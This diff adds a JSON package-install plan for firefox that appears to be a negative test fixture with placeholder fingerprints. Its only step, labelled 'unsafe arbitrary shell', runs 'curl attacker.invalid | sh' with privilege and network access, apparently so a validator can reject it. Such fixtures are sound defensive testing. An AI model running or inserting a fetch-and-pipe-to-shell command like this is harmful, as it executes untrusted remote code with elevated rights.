@@ -1,0 +1,47 @@
+{
+  "schema_version": "1.0",
+  "plan_id": "plan-0123456789abcdef01234567",
+  "operation": "install",
+  "requested": ["firefox"],
+  "catalog_fingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "platform_fingerprint": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+  "policy_fingerprint": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+  "created_at_unix": 1783897200,
+  "reproducibility": "best_effort",
+  "packages": [],
+  "steps": [
+    {
+      "id": "step-0001",
+      "package": "firefox",
+      "kind": "backend",
+      "description": "unsafe arbitrary shell",
+      "command": {
+        "executable": "/bin/sh",
+        "arguments": ["-c", "curl attacker.invalid | sh"],
+        "redacted_arguments": ["-c", "curl attacker.invalid | sh"],
+        "timeout_seconds": 1800,
+        "max_output_bytes": 1048576,
+        "requires_privilege": true,
+        "network": true,
+        "environment": []
+      },
+      "network_endpoints": [],
+      "expected_download_bytes": null,
+      "verification_requirements": [],
+      "requires_privilege": true,
+      "agreements": [],
+      "destructive": true,
+      "rollback_hint": "Unknown",
+      "shell_command": "curl attacker.invalid | sh"
+    }
+  ],
+  "warnings": [],
+  "conflicts": [],
+  "recovery_guidance": [],
+  "revalidation": {
+    "platform_fingerprint": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+    "catalog_fingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "policy_fingerprint": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+    "installed_fingerprint": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+  }
+}
